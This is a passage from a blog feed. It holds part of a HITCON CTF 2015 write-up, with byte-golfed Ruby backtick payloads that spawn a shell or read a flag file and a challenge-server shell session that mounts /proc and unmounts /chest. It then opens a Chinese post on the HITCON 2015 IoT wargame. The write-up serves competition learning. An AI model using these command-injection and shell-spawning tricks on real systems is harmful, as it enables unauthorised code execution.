&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;which equal to  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cat ./flag&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;as a string input.&lt;br /&gt;
then we got flag1.&lt;br /&gt;
&lt;code&gt;hitcon{what does the ruby say? @#$%!@&amp;amp;(%!#$&amp;amp;(%!@#$!$?...}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag2 (64 bytes)&lt;/h3&gt;
&lt;p&gt;After this, we got stucked with the 64 bytes limitation.&lt;br /&gt;
I came up with calling &lt;code&gt;sh&lt;/code&gt; to get shell instead of just &lt;code&gt;cat flag&lt;/code&gt;,&lt;br /&gt;
and one of my teammates found out that &lt;code&gt;$$&lt;/code&gt; is always &lt;code&gt;4&lt;/code&gt; on the target server.&lt;br /&gt;
So, we came up with the &lt;code&gt;61 bytes&lt;/code&gt; solution for flag2.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# $_ = 1, @_ = 10, $. = 104, $.+@_+$_ = 115; ascii(&amp;#39;s&amp;#39;) == 115; ascii(&amp;#39;h&amp;#39;) == 104;  &lt;/span&gt;
&lt;span class="c1"&gt;# `#{&amp;#39;&amp;#39;&amp;lt;&amp;lt;115&amp;lt;&amp;lt;104}` == `#{&amp;#39;sh&amp;#39;}`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After got the shell, just type &lt;code&gt;cat flag&lt;/code&gt; then &lt;code&gt;^D&lt;/code&gt; to get the output.&lt;br /&gt;
We got flag2.&lt;br /&gt;
&lt;code&gt;hitcon{Ruby in Peace m()m}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag3 (36 bytes)&lt;/h3&gt;
&lt;p&gt;One of my teammates came up with calling &lt;code&gt;$0&lt;/code&gt; instead of &lt;code&gt;sh&lt;/code&gt; to get shell,&lt;br /&gt;
we got the &lt;code&gt;26 bytes&lt;/code&gt; solution.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# `#{&amp;#39;$&amp;#39;&amp;lt;&amp;lt;48}` == `#{&amp;#39;$0&amp;#39;}`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then we got flag3&lt;br /&gt;
&lt;code&gt;hitcon{My cats also know how to code in ruby :cat:}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag4 (10 bytes)&lt;/h3&gt;
&lt;p&gt;After this, I was trying to find how to just embed number into the string not by using &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;.&lt;br /&gt;
I found this link &lt;a href="http://stackoverflow.com/questions/17169671/ruby-eval-with-string-interpolation"&gt;Ruby: eval with string interpolation - Stack Overflow&lt;/a&gt;.&lt;br /&gt;
I also found that the predefined variable &lt;code&gt;$.&lt;/code&gt; is &lt;code&gt;The number of the last line read from the current input file.&lt;/code&gt;&lt;br /&gt;
It means that in this use case, &lt;code&gt;$.&lt;/code&gt; will always be &lt;code&gt;1&lt;/code&gt;.&lt;br /&gt;
so I came up with &lt;code&gt;11 bytes&lt;/code&gt; solution  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Still 1 byte more than the limitation,&lt;br /&gt;
I kept finding if there's a predefined variable in Ruby defualt to &lt;code&gt;0&lt;/code&gt; or&lt;br /&gt;
if &lt;code&gt;nil&lt;/code&gt; can be trans to &lt;code&gt;0&lt;/code&gt; because lots of predefined variable are default to &lt;code&gt;nil&lt;/code&gt;.&lt;br /&gt;
But NO.  &lt;/p&gt;
&lt;p&gt;Then one of my teammates came up with the &lt;code&gt;10 bytes&lt;/code&gt; solution,&lt;br /&gt;
by using &lt;code&gt;~&lt;/code&gt;, the &lt;code&gt;Binary Ones Complement Operator&lt;/code&gt;. (bitwise Not)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="o"&gt;~-&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# `$#{~-1}` == `$#{0}` == `$0`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then we got flag4&lt;br /&gt;
&lt;code&gt;hitcon{It's hard to say where ruby went wrong QwO}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Note&lt;/h3&gt;
&lt;p&gt;After the competition end,&lt;br /&gt;
the author of this challenge released the same 10 bytes solution on IRC.&lt;br /&gt;
But said they got a &lt;code&gt;9 bytes&lt;/code&gt; solution  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="sr"&gt;//&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I don't know how this solution works,&lt;br /&gt;
but it does not work on my computer with Ruby 2.2.3,&lt;br /&gt;
which &lt;code&gt;~//&lt;/code&gt; will be treat as &lt;code&gt;nil&lt;/code&gt; instead of &lt;code&gt;0&lt;/code&gt;.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Stego - Piranha Gun [50]&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;The Piranha Gun is a post-Plantera Hardmode ranged weapon that fires a single, returning &amp;quot;piranha&amp;quot; projectile that costs no ammunition.  
`nc 54.178.235.243 10004`  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc &lt;span class="m"&gt;54&lt;/span&gt;.178.235.243 &lt;span class="m"&gt;10004&lt;/span&gt;  
bash: cannot &lt;span class="nb"&gt;set&lt;/span&gt; terminal process group &lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class="k"&gt;for&lt;/span&gt; device  
bash: no job control in this shell  
bash: /root/.bashrc: Permission denied  
root@ip-172-31-19-201:/home/PiranhaGun# ls  
ls  
README  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After connected to the server, there's a README.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/home/PiranhaGun# cat README  
cat README  
The Piranha Gun can be found in &amp;quot;jungle.chest&amp;quot;.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We searched if there's a file or directory with this name by using  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;grep -r "jungle.chest" / 2&amp;gt;/dev/null&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;grep -r "jungle" / 2&amp;gt;/dev/null&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;grep -r "chest" / 2&amp;gt;/dev/null&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;But NO. There's only a directory &lt;code&gt;/chest&lt;/code&gt;, but it's empty.  &lt;/p&gt;
&lt;p&gt;After tried something else, we still stucked.&lt;br /&gt;
Then, one of my teammates said he remembered security issue about the &lt;code&gt;proc&lt;/code&gt; in container.&lt;br /&gt;
After took a look at &lt;code&gt;ps&lt;/code&gt;, we got a clue.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/home/PiranhaGun# ps  
ps  
Error, do this: mount -t proc proc /proc  
root@ip-172-31-19-201:/home/PiranhaGun# mount -t proc proc /proc  
mount -t proc proc /proc  
root@ip-172-31-19-201:/home/PiranhaGun# cd /proc  
cd /proc  
root@ip-172-31-19-201:/proc# ls -al  
ls -al  
total 4  
dr-xr-xr-x 128 nobody nogroup               0 Oct 19 05:25 .  
drwxr-xr-x  23 nobody nogroup            4096 Oct 16 13:29 ..  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 1  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 2  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 7  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 acpi  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 buddyinfo  
dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 bus  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cgroups  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cmdline  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 consoles  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cpuinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 crypto  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 devices  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 diskstats  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 dma  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 driver  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 execdomains  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 fb  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 filesystems  
dr-xr-xr-x   8 nobody nogroup               0 Oct 19 05:26 fs  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 interrupts  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 iomem  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 ioports  
dr-xr-xr-x  49 nobody nogroup               0 Oct 19 05:26 irq  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 kallsyms  
-r--------   1 nobody nogroup 140737477877760 Oct 19 05:26 kcore  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 key-users  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 keys  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kmsg  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kpagecount  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kpageflags  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 loadavg  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 locks  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 mdstat  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 meminfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 misc  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 modules  
lrwxrwxrwx   1 nobody nogroup              11 Oct 19 05:26 mounts -&amp;gt; self/mounts  
-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 mtrr  
lrwxrwxrwx   1 nobody nogroup               8 Oct 19 05:26 net -&amp;gt; self/net  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 pagetypeinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 partitions  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 sched_debug  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 schedstat  
dr-xr-xr-x   3 nobody nogroup               0 Oct 19 05:26 scsi  
lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 self -&amp;gt; 7  
-r--------   1 nobody nogroup               0 Oct 19 05:26 slabinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 softirqs  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 stat  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 swaps  
dr-xr-xr-x   1 nobody nogroup               0 Oct 19 05:26 sys  
--w-------   1 nobody nogroup               0 Oct 19 05:26 sysrq-trigger  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 sysvipc  
lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 thread-self -&amp;gt; 7/task/7  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_list  
-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_stats  
dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 tty  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 uptime  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version_signature  
-r--------   1 nobody nogroup               0 Oct 19 05:26 vmallocinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 vmstat  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 xen  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 zoneinfo  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's take some search.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/proc# grep -r &amp;quot;chest&amp;quot; . 2&amp;gt;/dev/null  
grep -r &amp;quot;chest&amp;quot; . 2&amp;gt;/dev/null  
./1/task/1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./1/task/1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/task/2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./2/task/2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  
Binary file ./15/task/15/cmdline matches  
./15/task/15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./15/task/15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
Binary file ./15/cmdline matches  
./15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./15/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We've already found &lt;code&gt;/chest&lt;/code&gt; before and knew it's empty.&lt;br /&gt;
So, maybe unmount it?  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/proc# umount /chest  
umount /chest  
root@ip-172-31-19-201:/proc# cd /chest  
cd /chest  
root@ip-172-31-19-201:/chest# ls  
ls  
jungle.chest  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;ta da!  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/chest# cat jungle.chest  
cat jungle.chest  
hitcon{Wh1re d!d Y0u F1nd the Jungle Key}  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Stego - unreadable [100]&lt;/h2&gt;
&lt;p&gt;We got a file &lt;a href="/files/hitcon-ctf-2015-quals-write-up/unreadable-4b2868cc26a8dad5695e537a9dd8a164"&gt;unreadable-4b2868cc26a8dad5695e537a9dd8a164&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;by using &lt;code&gt;xxd&lt;/code&gt; to check it.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="unreadable" src="/files/hitcon-ctf-2015-quals-write-up/unreadable.png" /&gt;  &lt;/p&gt;
&lt;p&gt;the flag is &lt;code&gt;hitcon{WE USE XXD INSTEAD OF IDA PRO}&lt;/code&gt;  &lt;/p&gt;</summary><category term="CTF"></category><category term="HITCON"></category><category term="Write-up"></category><category term="Ruby"></category><category term="Conf"></category><category term="Security"></category></entry><entry><title>HITCON 2015 IOT Wargame</title><link href="https://blog.m157q.tw/posts/2015/08/29/hitcon-2015-iot-wargame/" rel="alternate"></link><published>2015-09-03T21:32:19+08:00</published><updated>2015-09-03T21:32:19+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-08-29:posts/2015/08/29/hitcon-2015-iot-wargame/</id><summary type="html">&lt;p&gt;今年的 HITCON 的主題是 IoT，&lt;br /&gt;
所以 Wargame 也配合了 IoT 的主題，&lt;br /&gt;
用 Arduino Nano + Raspberry Pi 出題。  &lt;/p&gt;
&lt;p&gt;Wargame 的網址是 &lt;a href="http://iot.hitcon.org"&gt;http://iot.hitcon.org&lt;/a&gt;&lt;br /&gt;
&lt;img alt="IOT Wargame" src="/files/hitcon-2015-iot-wargame/iot_wargame.png" /&gt;  &lt;/p&gt;
&lt;h2&gt;Arduino Nano 部份&lt;/h2&gt;
&lt;p&gt;Arduino Nano 的題目只有三題，&lt;br /&gt;
(原本好像有打算出四題的感覺，但可能時間來不及的關係)&lt;br /&gt;
而且難度蠻簡單的，&lt;br /&gt;
其實蠻適合所有會眾入門，&lt;br /&gt;
而且每位會眾報到後都會拿到已經把題目燒進去的 Arduino Nano。&lt;br /&gt;
(還有附排針，但題目不會用到，原本一看到以為要現場焊接XD)&lt;br /&gt;
但參與度好像不高，&lt;br /&gt;
寫這篇文章的當下，&lt;br /&gt;
總計是 243 位註冊帳號，&lt;br /&gt;
其中 161 位至少答對一題，&lt;br /&gt;
三題全部都做完的有 69 位。  &lt;/p&gt;
&lt;p&gt;我自己是在第一天議程結束後的晚上才開始看題目，&lt;br /&gt;
然後大概花3個多小時才把三題都解出來，&lt;br /&gt;
(GeoHot 花了一個多小時就全解完了QQ)&lt;br /&gt;
以下寫一下自己的解法，&lt;br /&gt;
供有興趣的人參考，&lt;br /&gt;
有問題也歡迎回覆。  &lt;/p&gt;
&lt;p&gt;其實題目真的不難，&lt;br /&gt;
真的有在打 Wargame 或 CTF 的人應該覺得簡單到沒必要浪費時間寫 Write-up 吧XD&lt;br /&gt;
但因為身邊還是有人不會寫，&lt;br /&gt;
所以秉持著推廣一下 Wargame 跟 CTF 的精神寫一下這部份，&lt;br /&gt;
Orange 出的 RPi 題目我就解不出來了 XDrz  &lt;/p&gt;
&lt;h3&gt;1. 讓 Arduino Nano 能被你的電腦讀到&lt;/h3&gt;
&lt;p&gt;老實說這應該是最難的部份了，&lt;br /&gt;
因為第一次接觸 Arduino，&lt;br /&gt;
所以我在這上面花蠻多時間的Orz&lt;br /&gt;
IRC 上也很多人在詢問，&lt;br /&gt;
有看到有人在問 Mac, Windows&lt;br /&gt;
就是沒看到有人問 Linux 的，&lt;br /&gt;
(噢，好像有看到有人問 Ubuntu 的?有點忘記了)&lt;br /&gt;
因為我本身用 Arch Linux，&lt;br /&gt;
所以這篇文章會以 Arch Linux 為主，&lt;br /&gt;
(順便偷偷推廣 &lt;a href="https://www.archlinux.org/"&gt;Arch Linux&lt;/a&gt; XD)  &lt;/p&gt;
&lt;p&gt;Windows 的使用者可以參考會眾 toby 寫的教學&lt;br /&gt;
&lt;a href="http://toby.logdown.com/posts/293552/hitcon-play-nano-on-windows"&gt;HITCON 之 Windows 也要玩 Nano « Toby 'n Hack&lt;/a&gt;，&lt;br /&gt;
仍然不行的話，可以看一下官方的 &lt;a href="https://www.arduino.cc/en/Guide/Windows"&gt;Arduino - Windows&lt;/a&gt; 試試。  &lt;/p&gt;
&lt;p&gt;Mac 的使用者可以參考這篇 &lt;a href="http://arduino.stackexchange.com/questions/5119/arduino-nano-no-serial-port-for-macbook-air-2013"&gt;Arduino Nano no serial port for MacBook Air 2013 - Arduino Stack Exchange&lt;/a&gt; (但有人反應裝了還是讀不到)&lt;br /&gt;
仍然不行的話，也可以看一下官方的 &lt;a href="https://www.arduino.cc/en/Guide/MacOSX"&gt;Arduino - MacOSX&lt;/a&gt; 試試。  &lt;/p&gt;
&lt;p&gt;至於 Linux 的話，可以參考 Arduino 官方的這篇 &lt;a href="http://playground.arduino.cc/Learning/Linux"&gt;Arduino Playground - Linux&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;而 Arch Linux 的話，當然就是看官方的 &lt;a href="https://wiki.archlinux.org/index.php/Arduino"&gt;Arduino - ArchWiki&lt;/a&gt;，從 AUR 上安裝 Arduino。  &lt;/p&gt;
&lt;p&gt;(但其實我在還沒安裝 AUR 的 Arduino 時，&lt;br /&gt;
就已經出現 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 了，&lt;br /&gt;
所以我覺得應該是有 driver 的，&lt;br /&gt;
但我當時還不知道怎麼改 &lt;code&gt;ans.py&lt;/code&gt; 的 port，&lt;br /&gt;
所以還是裝了 AUR 的 arduino 套件，&lt;br /&gt;
直到看到 &lt;a href="http://playground.arduino.cc/Interfacing/Python"&gt;Arduino Playground - Python&lt;/a&gt;&lt;br /&gt;
才發現是 &lt;code&gt;port&lt;/code&gt; 的值錯了&lt;br /&gt;
才覺得一開始可能不用裝 &lt;code&gt;arduino&lt;/code&gt; 也會動，&lt;br /&gt;
但也懶的移除了。&lt;br /&gt;
所以如果有人也有這樣的情況，然後也還沒裝 arduino 的話，&lt;br /&gt;
可以先試試看直接改 &lt;code&gt;ans.py&lt;/code&gt; 的 port，&lt;br /&gt;
看能不能用，這樣就不用多裝 3xx MB 的 arduino 套件了。&lt;br /&gt;
至於怎麼改 port，下面會提到)  &lt;/p&gt;
&lt;p&gt;如果沒有出現 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 或是試了不成功的話，&lt;br /&gt;
就繼續試試  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;yaourt -S arduino  
sudo gpasswd -a $user uucp  
sudo gpasswd -a $user lock  
sudo gpasswd -a $user tty  
sudo modprobe cdc_acm  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之後，登出再登入。&lt;br /&gt;
ArchWiki 上是說會出現 &lt;code&gt;/dev/ttyACMx&lt;/code&gt; (x 為數字)&lt;br /&gt;
但我的是 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt;，一樣可以正常使用。  &lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;screen /dev/ttyUSB0 115200&lt;/code&gt; 確認有顯示以下內容就是有讀到了  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HITCON 2015 NANO GAME  

Nano$ [0] Morse  
Nano$ [1] Maze  
Nano$ [2] Calculator  
Nano$ enter your choice:  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;2. 透過 pip 安裝 pyserial&lt;/h3&gt;
&lt;p&gt;在使用官方提供的 &lt;code&gt;ans.py&lt;/code&gt; 之前，&lt;br /&gt;
記得先安裝必要的套件 &lt;code&gt;pyserial&lt;/code&gt;&lt;br /&gt;
使用 &lt;code&gt;pip install pyserial&lt;/code&gt;&lt;br /&gt;
安裝完後，打開 &lt;code&gt;ans.py&lt;/code&gt;&lt;br /&gt;
將第 67 行的 &lt;code&gt;port=3&lt;/code&gt; 改成 &lt;code&gt;port='/dev/ttyUSB0'&lt;/code&gt;&lt;br /&gt;
(這邊的 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 視實際情況更改)&lt;br /&gt;
就可以開始修改 &lt;code&gt;ans.py&lt;/code&gt; 進行 Python Wargame 了(?)  &lt;/p&gt;
&lt;p&gt;修改第 47 行的 choice 可以選擇要解的題目，&lt;br /&gt;
'0' == NANO 1&lt;br /&gt;
'1' == NANO 2&lt;br /&gt;
'2' == NANO 3  &lt;/p&gt;
&lt;p&gt;每個 *.tgz 用 &lt;code&gt;tar zxvf $tgz_file&lt;/code&gt; 解開&lt;br /&gt;
每個裡面的 readme.txt 基本上都一樣的，不太需要看  &lt;/p&gt;
&lt;p&gt;每題拿到 key 之後，&lt;br /&gt;
請複製該 key，&lt;br /&gt;
再到 &lt;a href="http://iot.hitcon.org"&gt;http://iot.hitcon.org&lt;/a&gt; 登入，&lt;br /&gt;
然後點選對應的題目，&lt;br /&gt;
至右下角 &lt;code&gt;enter key&lt;/code&gt; 欄位，&lt;br /&gt;
貼上 key，之後按 send 送出。  &lt;/p&gt;
&lt;p&gt;以下開始講解各題：  &lt;/p&gt;
&lt;h3&gt;NANO 1&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-1.tgz"&gt;NANO 1 原始檔&lt;/a&gt;&lt;br /&gt;
